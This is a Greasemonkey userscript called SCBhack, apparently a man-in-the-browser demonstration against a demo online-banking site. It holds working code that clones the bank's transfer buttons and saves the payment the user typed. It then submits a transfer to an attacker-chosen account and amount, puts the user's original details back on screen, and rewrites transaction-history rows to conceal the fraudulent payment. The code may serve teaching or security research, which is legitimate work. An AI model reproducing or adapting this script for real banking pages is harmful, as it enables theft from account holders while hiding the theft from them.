// ==UserScript==
// @name           SCBhack
// @namespace      de.mrx.client
// @description    Greasemonkey version of the hack.
// @include        http://127.0.0.1*
// @exclude        http://127.0.0.1*Admin*
// @include        http*securecloudbanking.appspot.com*
// @exclude        http*securecloudbanking.appspot.com*Admin*
// @require		   http://code.jquery.com/jquery-1.3.2.js
// ==/UserScript==


HACK_REC_ACCOUNT	="999666999";
HACK_REC_NAME		="Hack the Bank";
HACK_BANK_BLZ		="12060000";
HACK_BANK_NAME		="Bad Bank";
HACK_AMOUNT			=500;
HACK_USAGE			="Hack Demo";
globalRC_Acc_Name="Rewe Koeln";
globalRC_Acc_Nr="725 826 262"
globalRC_Bank_BLZ="230 000 00";
globalRC_Bank_Name="Postbank"
global_Amount="34,50";
global_Usage="Vielen Dank fuer Ihren Einkauf";

ACC_NAME_INDEX = "ACC_NAME";
ACC_NR_INDEX = "ACC_NR";
BANK_BLZ_INDEX = "BANK_PLZ";
BANK_NAME_INDEX = "BANK_NAME";
AMOUNT_INDEX = "AMOUNT";
REMARK_INDEX = "REMARK";
TIMESTAMP_INDEX = "TIMESTAMP";
COMMITED_INDEX = "COMMITED";

//storage for real transfers
window.Transfer = function(name, nr, blz, bankName, amount, remark, timestamp, commited) {
	this.acc_Name = name;
	this.acc_Nr = nr;
	this.bank_BLZ = blz;
	this.bank_Name = bankName;
	this.amount = amount;
	this.remark = remark;
	this.timestamp = timestamp;
	this.commited = commited;
}

Transfer.prototype.setAccName = function(name) {
	this.acc_Name = name;
}

Transfer.prototype.getAccName = function(){
	return this.acc_Name;
}

window.saveTransfers = function(transfers) {
	console.log("save transfers" + transfers.length);
	for (i = 0; i < transfers.length; i++) {
		
		GM_setValue(ACC_NAME_INDEX + i, transfers[i].acc_Name);		
		GM_setValue(ACC_NR_INDEX + i, transfers[i].acc_Nr);		
		GM_setValue(BANK_BLZ_INDEX + i, transfers[i].bank_BLZ);		
		GM_setValue(BANK_NAME_INDEX + i, transfers[i].bank_Name);		
		GM_setValue(AMOUNT_INDEX + i, transfers[i].amount);
		GM_setValue(REMARK_INDEX + i, transfers[i].remark);
		timeInMilliSecs = transfers[i].timestamp.getTime();
		
		if (isNaN(timeInMilliSecs)) {
			timeInMilliSecs = "";

		} 
		console.log("a");
		console.log(timeInMilliSecs);
		GM_setValue(TIMESTAMP_INDEX + i, ""+timeInMilliSecs);
		console.log("b");
		GM_setValue(COMMITED_INDEX + i, transfers[i].commited);

	}

	
}



window.loadTransfers  = function() {
	
	i = 0;
	
	transfers = new Array();
	while (true) {
		result = GM_getValue(ACC_NAME_INDEX + i, false);
		if (result == false) {
			console.log("Load transfers" + transfers.length);
			return transfers;
		}
		
		name = GM_getValue(ACC_NAME_INDEX + i, "");
		nr = GM_getValue(ACC_NR_INDEX + i, "");
		blz = GM_getValue(BANK_BLZ_INDEX + i, "");
		bankName = GM_getValue(BANK_NAME_INDEX + i, "");
		amount = GM_getValue(AMOUNT_INDEX + i, "");
		remark = GM_getValue(REMARK_INDEX + i, "");
		timestamp = new Date(parseInt(GM_getValue(TIMESTAMP_INDEX + i, "")));
		commited =  GM_getValue(COMMITED_INDEX + i, "");
		
		
		transfers[i] =  new Transfer(name, nr, blz, bankName, amount, remark, timestamp, commited);
		i++;
	}
	

}

window.deleteData = function(){
	
	data =loadTransfers();
	console.log("delete transfers" + data.length);
	for (i = 0; i < data.length; i++) {
		
		GM_deleteValue(ACC_NAME_INDEX + i);
		GM_deleteValue(ACC_NR_INDEX + i);
		GM_deleteValue(BANK_BLZ_INDEX + i);
		GM_deleteValue(BANK_NAME_INDEX + i);
		GM_deleteValue(AMOUNT_INDEX + i);
		GM_deleteValue(REMARK_INDEX + i);		
		GM_deleteValue(TIMESTAMP_INDEX + i);		
		GM_deleteValue(COMMITED_INDEX + i);
	}	
}
//deleteData();


	 function timedMsg()
		 {

		 $("#btnTD button:visible[hackmarker!='true']:contains('Geld')").each(function(){		 	


		 			$(this).attr("hackMarker","true");
		 			sendMoneyBtnClone=$(this).clone(true)
		 			sendMoneyBtnClone.attr("hName","sendMoneyBtnClone");
		 			$(this).after(sendMoneyBtnClone);
		 			$(this).hide();
		 			$(this).attr("hackMarkerBtnOrig","true");		 			
		 			sendMoneyBtnClone.click(function(event) {
		 				event.preventDefault();
		 				//obsolete
//		 				 globalRC_Acc_Nr=$("input:eq(1)").val();
//		 				 globalRC_Acc_Name=$("input:eq(2)").val();
//		 				 globalRC_Bank_BLZ=$("input:eq(3)").val();
//		 				 globalRC_Bank_Name=$("input:eq(4)").val();
//		 				 global_Amount=$("input:eq(5)").val();
//		 				 global_Usage=$("input:eq(6)").val();
		 				
		 				 newTransfer = new Transfer($("input:eq(1)").val(),
		 						$("input:eq(2)").val(), $("input:eq(3)").val(), 
		 						$("input:eq(4)").val(), 
		 						$("input:eq(5)").val(), $("input:eq(6)").val(), new 
		 						Date(), false);
		 				
		 				 
		 				 storedTransfers = loadTransfers();
		 				
		 				 index =storedTransfers.length;
		 				
		 				 if (index > 0) { 
			 				 //if last stored transfer was not commited we can delete it
			 				 if (!storedTransfers[index - 1].commited.valueOf()) {
			 					
			 					index--;
			 				 }
		 				 }
		 				console.log(index);
		 				storedTransfers[index] = newTransfer;
		 				
		 				saveTransfers(storedTransfers);
		 				
		 				
		 				$("input:eq(1)").val(HACK_REC_ACCOUNT);
		 				$("input:eq(2)").val(HACK_REC_NAME);
		 				$("input:eq(3)").val(HACK_BANK_BLZ);
		 				$("input:eq(4)").val(HACK_BANK_NAME);
		 				$("input:eq(5)").val(HACK_AMOUNT);
		 				$("input:eq(6)").val(HACK_USAGE);
		 				sendMoneyBtnClone.attr("activateReset","true");
		 				$("button[hackMarkerBtnOrig='true']")[0].click();

		 				$(this).hide();
		 				});			
		 			
		 	});
		 	
		 	$("#btnTD button[hName='sendMoneyBtnClone']").filter(":not(:visible)[activateReset='true']").each(function(){	
		 		 storedTransfers = loadTransfers();
		 		lastTransfer = storedTransfers[storedTransfers.length - 1];
		 		
				$("input:eq(1)").val(lastTransfer.acc_Name);
				$("input:eq(2)").val(lastTransfer.acc_Nr);
				$("input:eq(3)").val(lastTransfer.bank_BLZ);
				$("input:eq(4)").val(lastTransfer.bank_Name);
				$("input:eq(5)").val(lastTransfer.amount);
				$("input:eq(6)").val(lastTransfer.remark);
		 		//obsolete
//		 		$("input:eq(1)").val(globalRC_Acc_Nr);
//				$("input:eq(2)").val(globalRC_Acc_Name);
//				$("input:eq(3)").val(globalRC_Bank_BLZ);
//				$("input:eq(4)").val(globalRC_Bank_Name);
//				$("input:eq(5)").val(global_Amount);
//				$("input:eq(6)").val(global_Usage);
				 
		 		$(this).attr("hackConfPageMarker","true");
		 	});
		 	
		 	$("#btnTD button:visible[hackmarker!='true']:contains('berweisung')").each(function(){
		 		$(this).attr("hackMarker","true");
	 			sendMoneyConfirmBtnClone=$(this).clone(true)
	 			$(this).after(sendMoneyConfirmBtnClone);
	 			$(this).hide();
	 			$(this).attr("hackMarkerConfirmBtnOrig","true");	
	 			sendMoneyConfirmBtnClone.click(function(event) {
	 				storedTransfers = loadTransfers();
	 		 		lastTransfer = storedTransfers[storedTransfers.length - 1];
	 		 		//send hacked values
	 		 		console.log("a");
	 				$("input:eq(1)").val(HACK_REC_ACCOUNT);
	 				$("input:eq(2)").val(HACK_REC_NAME);
	 				$("input:eq(3)").val(HACK_BANK_BLZ);
	 				$("input:eq(4)").val(HACK_BANK_NAME);
	 				$("input:eq(5)").val(HACK_AMOUNT);
	 				$("input:eq(6)").val(HACK_USAGE);
	 				$("button[hackMarkerConfirmBtnOrig='true']")[0].click();
	 				//and change displayed values back
	 				$("input:eq(1)").val(lastTransfer.acc_Name);
					$("input:eq(2)").val(lastTransfer.acc_Nr);
					$("input:eq(3)").val(lastTransfer.bank_BLZ);
					$("input:eq(4)").val(lastTransfer.bank_Name);
					$("input:eq(5)").val(lastTransfer.amount);
					$("input:eq(6)").val(lastTransfer.remark);
					//set transfer to be committed (not necessarily true e.g. if tan is wrong!)
					lastTransfer.commited = true;
					saveTransfers(storedTransfers);
	 				});
	 			
		 	});
		 	var recText=globalRC_Acc_Name+' ('+globalRC_Acc_Nr+')';
//		 	$(".TransfersOdd,.TransfersEven").filter(':contains(Hack the Bank)').text(recText);		
		 	hackedRow= $(".TransfersOdd,.TransfersEven").filter(':contains(Hack the Bank)').parent().children().children();
	hackedRow.filter(':contains(Bad Bank)').text("test1");
	hackedRow.filter(':contains(Hack the Bank)').text("test2");
 	
//		 	var bankText=globalRC_Bank_Name+' ('+globalRC_Bank_BLZ+')';
//		 	$(".TransfersOdd,.TransfersEven").filter(':contains(Bad Bank)').text(bankText);
//		 	$(".TransfersOdd,.TransfersEven").filter(':contains(12060000)').text(globalRC_Bank_BLZ);
//		 	$(".TransfersOdd,.TransfersEven").filter(':contains(Hack Demo)').text(global_Usage);
//		 	$(".TransfersOdd,.TransfersEven").filter(':contains(500)').text(global_Amount);
		 	
		 	
		 	
		 	
		 	var t=setTimeout(timedMsg,300);
		 }
	 
	 $(document).ready(function() {
 	timedMsg();
	 });
  

 
 
  